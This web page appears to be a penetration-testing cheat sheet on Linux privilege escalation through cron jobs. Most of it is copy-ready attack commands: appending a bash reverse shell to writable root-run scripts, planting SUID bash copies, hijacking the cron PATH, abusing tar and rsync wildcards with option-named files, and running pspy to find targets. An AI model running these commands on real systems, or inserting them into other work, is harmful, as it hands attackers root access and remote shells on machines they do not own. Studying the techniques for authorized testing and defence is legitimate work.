title: Linux PrivEsc — Cron Job Abuse
html:
Linux PrivEsc — Cron Job Abuse

Cron jobs running as root with writable scripts, exploitable wildcards, or PATH hijacking are reliable privesc vectors. Use pspy to discover hidden scheduled tasks.

Find Cron Jobs

# System-wide crontab
cat /etc/crontab

# Drop-in cron directories
ls -la /etc/cron.d/
cat /etc/cron.d/*
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.weekly/
ls -la /etc/cron.monthly/

# Current user crontab
crontab -l

# Other users' crontabs
ls -la /var/spool/cron/
ls -la /var/spool/cron/crontabs/
sudo cat /var/spool/cron/crontabs/root 2>/dev/null

# Systemd timers (modern alternative to cron)
systemctl list-timers --all
systemctl list-timers --all --no-pager

# Anacron
cat /etc/anacrontab 2>/dev/null

Writable Cron Scripts

If a script executed by root's cron is writable by the current user, inject a payload.

# Check permissions of scripts in crontab
ls -la /path/to/cron_script.sh
stat /path/to/cron_script.sh

# If writable, append reverse shell
echo 'bash -i >& /dev/tcp/<lhost>/<lport> 0>&1' >> /path/to/cron_script.sh

# Or append SUID bash copy
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/to/cron_script.sh

# Wait for cron to execute, then:
/tmp/rootbash -p

# Or set up listener on attacker:
nc -lvnp <lport>

Also check: permissions of the directory containing the script — if the directory is writable, you can replace the file entirely.

# Check parent directory permissions
ls -la $(dirname /path/to/cron_script.sh)

PATH Hijacking in Cron

If a cron job calls a binary without its full path, and the PATH in /etc/crontab includes a writable directory earlier than the real binary's location, plant a malicious version there.

# Step 1: Check PATH in /etc/crontab
cat /etc/crontab
# Example: PATH=/home/<username>:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# Step 2: If /home/<username> is writable and cron calls, say, 'backup'
# Create malicious 'backup' in /home/<username>
cat > /home/<username>/backup <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash
EOF
chmod +x /home/<username>/backup

# Wait for cron to run, then:
/tmp/rootbash -p

# Reverse shell variant
cat > /home/<username>/backup <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<lhost>/<lport> 0>&1
EOF
chmod +x /home/<username>/backup

Wildcard Injection

When a cron job runs a command with * (e.g., tar czf backup.tar.gz *), filenames that look like flags are interpreted as options by the command.

tar Wildcard Exploit

# Cron runs: cd /var/backups && tar czf backup.tar.gz *
# If /var/backups is writable:

# Create the payload script
cat > /var/backups/shell.sh <<'EOF'
#!/bin/bash
bash -i >& /dev/tcp/<lhost>/<lport> 0>&1
EOF
chmod +x /var/backups/shell.sh

# Create files that become tar options
touch /var/backups/'--checkpoint=1'
touch /var/backups/'--checkpoint-action=exec=bash shell.sh'

# tar interprets these files as options and executes shell.sh
# Wait for cron, listen on attacker:
nc -lvnp <lport>

rsync Wildcard Exploit

# Cron runs: rsync * /backup/
# Create files as rsync options
touch -- '-e sh shell.sh'

Monitor with pspy

# Download from https://github.com/DominicBreuker/pspy/releases
# Transfer to target then:

chmod +x pspy64

# Run with process and filesystem events, 1 second interval
./pspy64 -pf -i 1000

# Run for a set duration then exit
timeout 60 ./pspy64 -pf -i 1000

# Log output to file for review
./pspy64 -pf -i 1000 | tee /tmp/pspy_out.txt

What to look for:

  • Commands run by UID=0 (root) that call scripts in writable paths
  • Commands that use wildcards (*)
  • Scripts in /tmp, /dev/shm, or user home dirs
  • Repeating patterns (every minute, every 5 minutes)
excerpt: Exploit Linux cron jobs for privilege escalation — writable scripts, PATH hijacking, tar/rsync wildcard injection, and pspy process monitoring.
